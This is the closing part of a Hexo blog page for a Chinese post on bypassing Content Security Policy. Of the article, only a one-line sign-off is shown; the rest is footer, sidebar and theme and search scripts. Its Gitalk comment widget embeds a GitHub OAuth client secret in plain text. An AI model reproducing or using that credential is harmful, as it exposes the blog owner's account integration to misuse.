+<p>内容比较基础，文中有描述错误欢迎斧正，有更好案例的希望能够py。感谢浏览至此。</p>
+</script></p>
+      
+    </div>
+
+    
+
+    
+    
+    
+      <div>
+    
+        <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="icon ion-md-power"></i>感谢您的阅读-------------</div>
+    
+</div>
+    
+      </div>
+
+    
+
+    
+      
+    
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div></div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>Donate</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+
+    
+      <div id="alipay" style="display: inline-block">
+        <img id="alipay_qr" src="/images/alipay.png" alt="SuNu11 Alipay">
+        <p>Alipay</p>
+      </div>
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+
+    
+      <div>
+        
+
+
+
+  
+
+
+
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>Post author:  </strong>SuNu11</li>
+  <li class="post-copyright-link">
+    <strong>Post link: </strong>
+    
+    <a href="http://sunu11.com/2019/12/13/learning-CSP/" title="learning_CSP">http://sunu11.com/2019/12/13/learning-CSP/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC8="><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</span> unless stating additionally.</li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/bypass/" rel="tag"><i class="fa fa-tag"></i> bypass</a>
+          
+            <a href="/tags/前端安全/" rel="tag"><i class="fa fa-tag"></i> 前端安全</a>
+          
+            <a href="/tags/CSP/" rel="tag"><i class="fa fa-tag"></i> CSP</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/09/05/Trojans_avoid_killing/" rel="next" title="免杀">
+                <i class="fa fa-chevron-left"></i> 免杀
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+    <div class="comments" id="gitalk-container">
+    </div>
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/me.png" alt="SuNu11">
+            
+              <p class="site-author-name" itemprop="name">SuNu11</p>
+              <p class="site-description motion-element" itemprop="description">淡泊以明志，宁静以致远</p>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives">
+                
+                    <span class="site-state-item-count">38</span>
+                    <span class="site-state-item-name">posts</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  <a href="/categories/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">9</span>
+                    <span class="site-state-item-name">categories</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  <a href="/tags/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">48</span>
+                    <span class="site-state-item-name">tags</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3N1bnUxMQ==" title="GitHub &rarr; https://github.com/sunu11"><i class="fa fa-fw fa-github"></i>GitHub</span>
+                </span>
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <span class="exturl" data-url="bWFpbHRvOjk1ODEzMDQyMUBxcS5jb20=" title="E-Mail &rarr; mailto:958130421@qq.com"><i class="fa fa-fw fa-envelope"></i>E-Mail</span>
+                </span>
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <span class="exturl" data-url="aHR0cDovL3dlaWJvLmNvbS9zdW51MTE=" title="Weibo &rarr; http://weibo.com/sunu11"><i class="fa fa-fw fa-weibo"></i>Weibo</span>
+                </span>
+              
+                <span class="links-of-author-item">
+                  
+                  
+                    
+                  
+                  
+                    
+                  
+                  <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9zdV9udTEx" title="Twitter &rarr; https://twitter.com/su_nu11"><i class="fa fa-fw fa-twitter"></i>Twitter</span>
+                </span>
+              
+            </div>
+          
+
+          
+             <div class="cc-license motion-element" itemprop="license">
+              
+                
+              
+              
+              
+              <span class="exturl cc-opacity" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC8="><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></span>
+             </div>
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Friends
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <span class="exturl" data-url="aHR0cDovL3d3dy5zZWMtcmVkY2x1Yi5jb20v" title="http://www.sec-redclub.com/">Redbu11</span>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <span class="exturl" data-url="aHR0cDovL2RicWYueHl6Lw==" title="http://dbqf.xyz/">大兄弟(独步清风)</span>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <span class="exturl" data-url="aHR0cDovL3d3dy52aXJ6ei5jb20v" title="http://www.virzz.com/">V神(Virink)</span>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <span class="exturl" data-url="aHR0cDovL3d3dy5tb25idXJhbi5jbi8=" title="http://www.monburan.cn/">大兄弟(Monburan)</span>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <span class="exturl" data-url="aHR0cDovL3d3dy5jbmJsb2dzLmNvbS9uMWdodHdhdGNoZXIv" title="http://www.cnblogs.com/n1ghtwatcher/">老哥(n1ghtwatcher)</span>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <span class="exturl" data-url="aHR0cDovL3d3dy5nbGFtb3Iuc2l0ZS8=" title="http://www.glamor.site/">大诏(glamor)</span>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vcGlhb21pYW9ob25nY2hlbi8=" title="https://www.cnblogs.com/piaomiaohongchen/">超神哥</span>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <span class="exturl" data-url="aHR0cDovL3FjbG92ZXIuY24=" title="http://qclover.cn">华清(Qclover)</span>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <span class="exturl" data-url="aHR0cHM6Ly9sb25lbHlzZWMuY29tLw==" title="https://lonelysec.com/">薯片(CK)</span>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+            
+          
+          
+
+        </div>
+      </div>
+
+      
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0X01-什么是CSP"><span class="nav-number">1.</span> <span class="nav-text">0X01 什么是CSP</span></a></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
+
+      
+        <div class="back-to-top">
+          <i class="fa fa-arrow-up"></i>
+          
+            <span id="scrollpercent"><span>0</span>%</span>
+          
+        </div>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">  <span class="exturl" data-url="aHR0cDovL3d3dy5taWl0YmVpYW4uZ292LmNu">京ICP备16045158号 </span>&copy; 2016 – <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">SuNu11</span>
+
+  
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <span class="exturl theme-link" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme – <span class="exturl theme-link" data-url="aHR0cHM6Ly90aGVtZS1uZXh0Lm9yZw==">NexT.Mist</span></div>
+
+
+
+
+        
+
+
+
+
+
+
+  <div style="display: none;">
+    <script src="//s95.cnzz.com/z_stat.php?id=1275798487&web_id=1275798487"></script>
+  </div>
+
+
+
+        
+      </div>
+    </footer>
+
+    
+
+    
+
+    
+
+    
+  </div>
+
+  
+
+<script>
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+    
+    
+  
+  <script color="0,0,255" opacity="0.5" zindex="-1" count="99" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+
+  
+
+
+  <script src="/js/src/utils.js?v=6.7.0"></script>
+
+  <script src="/js/src/motion.js?v=6.7.0"></script>
+
+
+
+  
+  
+
+
+  <script src="/js/src/schemes/muse.js?v=6.7.0"></script>
+
+
+
+
+  
+  <script src="/js/src/scrollspy.js?v=6.7.0"></script>
+<script src="/js/src/post-details.js?v=6.7.0"></script>
+
+
+
+  
+
+
+  <script src="/js/src/bootstrap.js?v=6.7.0"></script>
+
+
+
+  
+
+
+  
+    
+  <link rel="stylesheet" href="/css/gitalk.css">
+  <script src="/js/src/gitalk.min.js"></script>
+  <script src="/js/src/md5.min.js"></script>
+   <script type="text/javascript">
+        var gitalk = new Gitalk({
+          clientID: 'daf81de63d9e084c5c7e',
+          clientSecret: 'f7fb861f10ddc5fd1292da542d50e34d0153be8a',
+          repo: 'blog-comment',
+          owner: 'sunu11',
+          admin: ['sunu11'],
+          id: md5( location.pathname ),
+          distractionFreeMode: ''
+        })
+        gitalk.render('gitalk-container')
+    </script>
+
+  
+
+
+  
+
+  <script>
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url).replace(/\/{2,}/g, '/');
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x"></i></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x"></i></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+  <script src="/js/src/exturl.js?v=6.7.0"></script>
+
+
+  
+
+  
+
+  
+
+</body>
+</html>
+<!-- 页面点击小红心 -->
+<script type="text/javascript" src="/js/src/love.js"></script>
